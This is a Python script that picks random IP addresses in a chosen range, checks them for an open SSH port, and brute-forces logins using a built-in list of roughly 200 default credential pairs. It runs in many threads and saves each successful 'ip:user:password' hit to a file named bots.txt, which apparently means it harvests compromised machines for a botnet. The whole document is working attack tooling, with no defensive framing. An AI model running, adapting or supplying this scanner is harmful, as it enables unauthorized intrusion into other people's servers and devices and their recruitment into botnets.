import os,threading,random,socket,sys
try:
 import paramiko
 from paramiko import SSHClient, AutoAddPolicy
except:
 print"you need to install: paramiko"
 sys.exit()
o=input("\033[92mIP range:\n>")
th=input("Threads:\n>")
with open("bots.txt", "a+") as f:
        f.close()
wl=[
"admin:admin",
"root:toor",
"Admin:Admin",
"Admin:12345",
"admin:12345",
"admin:1234",
"admin:4321",
"Admin:123456",
"admin:123456",
"admin:password",
"user:password",
"user:user",
"service:service",
"ubnt:ubnt",
"Root:Pass",
"root:pass",
"admin:michelangelo",
"sitecom:admin",
"test:test",
"Test:test",
"Test:Test",
"ssh:ssh",
"root:synopass",
"pi:raspberry",
"synouser:synopass",
"root:root",
"Root:Root",
"usuario:usuario",
"support:support",
"Support:Support",
"root:Zte521",
"root:anko",
"telnet:telnet",
"admin:default",
"www:www",
"test:12345",
"webmaster:webmaster",
"root:webmaster",
"operator:operator",
"administrator:administrator",
"admin:administrator",
"PlcmSpIp:PlcmSpIp",
"guest:guest",
"root:server",
"demo:demo",
"git:git",
"ftpuser:asteriskftp",
"adm:adm",
"uucp:uucp",
"123:123",
"admin:ssh",
"user:password",
"user:user",
"info:123456",
" : ",
"admin:admin",
"support:support",
"uucp:uucp",
"admin:default",
"admin:password",
"guest:guest",
"root:root",
"sync:click1",
"auction:auction",
"test:test1234",
"apache:apache",
"www:www",
"testuser:testpass",
"takeuchi:takeuchi",
"mail:mail",
"git:git",
"root:1qazxsw2",
"ftp:ftp",
"anonymous:anonymous",
"takeuchi:takeuchi123",
"report:report",
"sshd:"
"www-data:123456",
"man:man",
"admin:1234",
"mysql:mysql",
"root:password",
"root:pfsense",
"demo:demo123",
"junk:junk",
"icinga:icinga",
"postfix:postfix",
"adm:admin",
"nagios:nagios",
"shimoda:shimoda",
"fedora:fedora",
"root:global",
"test:test",
"camera:",
"testuser:testuser",
"root:000000",
"git:git1234",
"tmp:tmp",
"jenkins:jenkins",
"share:share",
"ftpuser:ftpuser",
"sato:sato",
"pi:pi123",
"home:home",
"test1:123456",
"wordpress:wordpress",
"root:Passw0rd",
"db2inst1:db2inst1",
"root:z0x9c8v7",
"pi:raspberry",
"pc1:pc1",
"admin:",
"guest:",
"a:a",
"tomcat:tomcat",
"ghost:ghost",
"centos:centos",
"test1:test1",
"cc:cc",
"master:master",
"matsumoto:matsumoto",
"info:info",
"adm:adm",
"root:admin",
"rony:rony",
"admin:abcd1234",
"vyatta:vyatta",
"staff:staff",
"redmine:redmine",
"vyos:vyos",
"watanabe:watanabe",
"post:post",
"cyrus:cyrus",
"cms:cms",
"postgres:postgres",
"operator:operator",
"ftptest:ftptest",
"admin:admin1234",
"testuser:test",
"sysadmin:PASS",
"user:user",
"ftp:ftpuser",
"git:123456",
"root:dreambox",
"ftpuser:ftppass",
"test:123",
"prueba:prueba",
"osmc:osmc",
"cloud:cloud",
"student:student",
"root:nas4free",
"hduser:hduser",
"public:public",
"user2:user2",
"teste:123456",
"root:alpine",
"vikas:vikas123",
"hduser:hadoop",
"teste:teste123",
"monitor:123456",
"root:calvin",
"username:password",
"teste:teste",
"monitor:monitor",
"service:service",
"server:server",
"ubnt:ubnt",
"pro:pro",
"admin:131313",
"cisco:cisco",
"cron:test",
"edi:edi",
"username:username",
"12345:browse",
"zabbix:zabbix",
"admin:12345678",
"qa:qa",
"test:password123",
"null:null",
"tecmint:tecmint",
"aidvolunteers:41dv0lunt33rs",
"mysql:",
"alan:alan",
"pi:pi",
"admin:sysadmin",
"shipping:shipping",
"ubnt:password",
"root:ceadmin"
""
]
i=0
z=0
class ssh(threading.Thread):
 def run(self):
  global i
  global z
  while True:
   ip=str(o)+'.'+ str(random.randint(0,255))+'.'+ str(random.randint(0,255))+'.'+ str(random.randint(0,255))
   q=0
   try:
    s=socket.socket()
    s.settimeout(3)
    s.connect((ip,22))
    q+=1
    s.close()
   except:
    pass
   if q>0:
    for l in wl:
     try:
      sshConnection = SSHClient()
      sshConnection.set_missing_host_key_policy(AutoAddPolicy())
      user=l.split(":")[0]
      pwd=l.split(":")[1]
      sshConnection.connect(ip, port=22,username=user, password=pwd)
      ip+=":"+user+":"+pwd
      print ip
      pr=[]
      f=open("bots.txt", "r")
      fl =f.readlines()
      for x in fl:
       pr.append(x)
      if ip not in pr:
       with open("bots.txt" ,"a") as fi:
        fi.write(ip+'\n')
     except:
      pass
for c in range(th):
 t=ssh()
 t.start()